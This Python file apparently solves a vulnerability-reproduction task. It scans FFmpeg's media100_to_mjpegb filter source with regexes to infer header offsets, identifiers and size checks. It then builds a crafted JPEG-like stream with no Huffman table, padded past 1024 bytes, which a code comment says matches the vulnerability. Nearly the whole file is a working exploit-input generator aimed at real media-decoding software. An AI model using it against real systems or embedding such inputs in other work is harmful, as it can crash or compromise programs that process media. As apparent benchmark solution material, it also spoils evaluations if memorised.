import os
import re
import tarfile
import struct
from typing import Optional, Tuple


class Solution:
    def _read_text_file_from_tar(self, tar_path: str, suffix: str) -> Optional[str]:
        try:
            with tarfile.open(tar_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name = m.name
                    if name.endswith(suffix) or suffix in name:
                        try:
                            f = tf.extractfile(m)
                            if not f:
                                continue
                            data = f.read()
                        except Exception:
                            continue
                        try:
                            return data.decode("utf-8", errors="ignore")
                        except Exception:
                            return None
        except Exception:
            return None
        return None

    def _read_text_file_from_dir(self, root: str, filename: str) -> Optional[str]:
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                if fn == filename:
                    p = os.path.join(dirpath, fn)
                    try:
                        with open(p, "rb") as f:
                            return f.read().decode("utf-8", errors="ignore")
                    except Exception:
                        continue
        return None

    def _find_media100_source(self, src_path: str) -> Optional[str]:
        target = "media100_to_mjpegb"
        if os.path.isdir(src_path):
            for dirpath, _, filenames in os.walk(src_path):
                for fn in filenames:
                    if target in fn and fn.endswith(".c"):
                        p = os.path.join(dirpath, fn)
                        try:
                            with open(p, "rb") as f:
                                return f.read().decode("utf-8", errors="ignore")
                        except Exception:
                            continue
            return None

        if os.path.isfile(src_path):
            txt = self._read_text_file_from_tar(src_path, "media100_to_mjpegb.c")
            if txt is not None:
                return txt
            txt = self._read_text_file_from_tar(src_path, "media100_to_mjpegb")
            if txt is not None:
                return txt
        return None

    def _detect_soi_offset(self, text: Optional[str]) -> int:
        if not text:
            return 0

        offsets = set()

        for m in re.finditer(r'AV_RB16\s*\(\s*[^)]*->data\s*\+\s*(\d+)\s*\)\s*==\s*0xFFD8', text):
            offsets.add(int(m.group(1)))
        for m in re.finditer(r'AV_RB16\s*\(\s*[^)]*->data\s*\+\s*(\d+)\s*\)\s*!=\s*0xFFD8', text):
            offsets.add(int(m.group(1)))

        # Look for bytewise checks: data[i] == 0xff and data[i+1] == 0xd8
        for m in re.finditer(r'->data\s*\[\s*(\d+)\s*\]\s*!=\s*0x?ff', text, flags=re.IGNORECASE):
            i = int(m.group(1))
            window = text[max(0, m.start() - 120):m.start() + 300]
            if re.search(r'->data\s*\[\s*%d\s*\]' % (i + 1), window) and re.search(r'0x?d8', window, flags=re.IGNORECASE):
                offsets.add(i)

        if not offsets:
            return 0
        if 0 in offsets:
            return 0
        return min(offsets)

    def _detect_app0_id(self, text: Optional[str]) -> bytes:
        if not text:
            return b"JFIF\x00"
        candidates = [b"AVI1\x00", b"M100\x00", b"Media\x00", b"MJPG\x00", b"JFIF\x00"]
        t = text
        for c in candidates:
            s = c[:-1].decode("ascii", errors="ignore")
            if s and s in t:
                return c
        if "AVI1" in t:
            return b"AVI1\x00"
        if "M100" in t or "Media100" in t or "MEDIA100" in t:
            return b"M100\x00"
        if "MJPG" in t:
            return b"MJPG\x00"
        return b"JFIF\x00"

    def _detect_header32_constraint(self, text: Optional[str]) -> Optional[Tuple[str, int]]:
        if not text:
            return None
        # Look for explicit compare at offset 0: AV_RL32(in->data) != 0x....
        m = re.search(r'AV_RL32\s*\(\s*[^)]*->data\s*\)\s*(?:!=|==)\s*(0x[0-9A-Fa-f]+)', text)
        if m:
            return ("LE", int(m.group(1), 16))
        m = re.search(r'AV_RB32\s*\(\s*[^)]*->data\s*\)\s*(?:!=|==)\s*(0x[0-9A-Fa-f]+)', text)
        if m:
            return ("BE", int(m.group(1), 16))
        # If reads RL32/RB32 at start, but no constant, assume length field.
        if re.search(r'AV_RL32\s*\(\s*[^)]*->data\s*\)', text):
            return ("LE", -1)
        if re.search(r'AV_RB32\s*\(\s*[^)]*->data\s*\)', text):
            return ("BE", -1)
        return None

    def _detect_min_size(self, text: Optional[str]) -> int:
        if not text:
            return 0
        mins = []
        for m in re.finditer(r'(?:in|pkt)->size\s*<\s*(\d+)', text):
            try:
                mins.append(int(m.group(1)))
            except Exception:
                pass
        for m in re.finditer(r'(?:in|pkt)->size\s*<=\s*(\d+)', text):
            try:
                mins.append(int(m.group(1)) + 1)
            except Exception:
                pass
        min_size = max(mins) if mins else 0

        # If file references 1024/0x400, be conservative.
        if re.search(r'\b1024\b|\b0x400\b', text):
            min_size = max(min_size, 1025)

        # Also ensure size covers any direct ->data[index] access (within a reasonable range)
        max_idx = -1
        for m in re.finditer(r'(?:in|pkt)->data\s*\[\s*(\d+)\s*\]', text):
            try:
                idx = int(m.group(1))
                if idx > max_idx and idx < 1_000_000:
                    max_idx = idx
            except Exception:
                pass
        if max_idx >= 0:
            min_size = max(min_size, max_idx + 1)

        return min_size

    def _jpeg_app0(self, ident5: bytes) -> bytes:
        # APP0 marker with length 16 (14 bytes payload)
        payload = bytearray(14)
        payload[0:5] = ident5[:5]
        # remaining bytes are zeros; for JFIF this would normally include version, density, etc.
        return b"\xFF\xE0" + b"\x00\x10" + bytes(payload)

    def _jpeg_dqt(self) -> bytes:
        # One 8-bit quant table (id 0), all ones.
        qt = bytes([1] * 64)
        payload = b"\x00" + qt
        return b"\xFF\xDB" + b"\x00\x43" + payload

    def _jpeg_sof0_1x1_3comp(self) -> bytes:
        # Baseline DCT, 1x1, 3 components, all using QT 0, sampling 1x1
        payload = bytearray()
        payload += b"\x08"          # precision
        payload += b"\x00\x01"      # height
        payload += b"\x00\x01"      # width
        payload += b"\x03"          # components
        payload += b"\x01\x11\x00"  # Y
        payload += b"\x02\x11\x00"  # Cb
        payload += b"\x03\x11\x00"  # Cr
        return b"\xFF\xC0" + b"\x00\x11" + bytes(payload)

    def _jpeg_sos_3comp_all_ht0(self) -> bytes:
        payload = bytearray()
        payload += b"\x03"          # components
        payload += b"\x01\x00"      # Y: DC0/AC0
        payload += b"\x02\x00"      # Cb: DC0/AC0
        payload += b"\x03\x00"      # Cr: DC0/AC0
        payload += b"\x00\x3F\x00"  # Ss, Se, Ah/Al
        return b"\xFF\xDA" + b"\x00\x0C" + bytes(payload)

    def _jpeg_entropy_minimal_3blocks_std_tables(self) -> bytes:
        # For each of 3 blocks: DC category 0 => '00', AC EOB => '1010' (standard luminance AC)
        # Concatenated bits: (00 1010) * 3 = 18 bits => 0x28 0xA2 0xBF (padded with 1s)
        return b"\x28\xA2\xBF"

    def _build_jpeg(self, app0_id: bytes, total_len: int) -> bytes:
        # Build a JPEG-like stream (no DHT; bsf is expected to add it, matching vulnerability).
        # Ensure EOI is the final two bytes; insert zero padding within scan data if needed.
        soi = b"\xFF\xD8"
        app0 = self._jpeg_app0(app0_id)
        dqt = self._jpeg_dqt()
        sof0 = self._jpeg_sof0_1x1_3comp()
        sos = self._jpeg_sos_3comp_all_ht0()
        entropy = self._jpeg_entropy_minimal_3blocks_std_tables()
        eoi = b"\xFF\xD9"

        head = soi + app0 + dqt + sof0 + sos
        base_wo_eoi = head + entropy
        base_len = len(base_wo_eoi) + 2

        if total_len < base_len:
            total_len = base_len
        pad_len = total_len - base_len
        return base_wo_eoi + (b"\x00" * pad_len) + eoi

    def solve(self, src_path: str) -> bytes:
        text = self._find_media100_source(src_path)
        soi_offset = self._detect_soi_offset(text)
        app0_id = self._detect_app0_id(text)
        min_size = self._detect_min_size(text)
        total_len = max(1025, min_size, soi_offset + 64)

        jpeg_len = max(0, total_len - soi_offset)
        jpeg = self._build_jpeg(app0_id, jpeg_len)

        if soi_offset <= 0:
            return jpeg

        prefix = bytearray(b"\x00" * soi_offset)
        header32 = self._detect_header32_constraint(text)
        if soi_offset >= 4:
            if header32 is not None:
                endian, val = header32
                if val >= 0:
                    if endian == "LE":
                        prefix[0:4] = struct.pack("<I", val & 0xFFFFFFFF)
                    else:
                        prefix[0:4] = struct.pack(">I", val & 0xFFFFFFFF)
                else:
                    # assume length field
                    if endian == "LE":
                        prefix[0:4] = struct.pack("<I", len(jpeg) & 0xFFFFFFFF)
                    else:
                        prefix[0:4] = struct.pack(">I", len(jpeg) & 0xFFFFFFFF)
            else:
                # If unknown, set a symmetric 32-bit value (same in LE/BE) to avoid brittle checks.
                prefix[0:4] = b"\x01\x00\x00\x01"

        out = bytes(prefix) + jpeg
        if len(out) < total_len:
            out = out[:-2] + (b"\x00" * (total_len - len(out))) + out[-2:]
        elif len(out) > total_len:
            if len(out) >= 2:
                keep = total_len - 2
                if keep < 0:
                    keep = 0
                out = out[:keep] + out[-2:]
        return out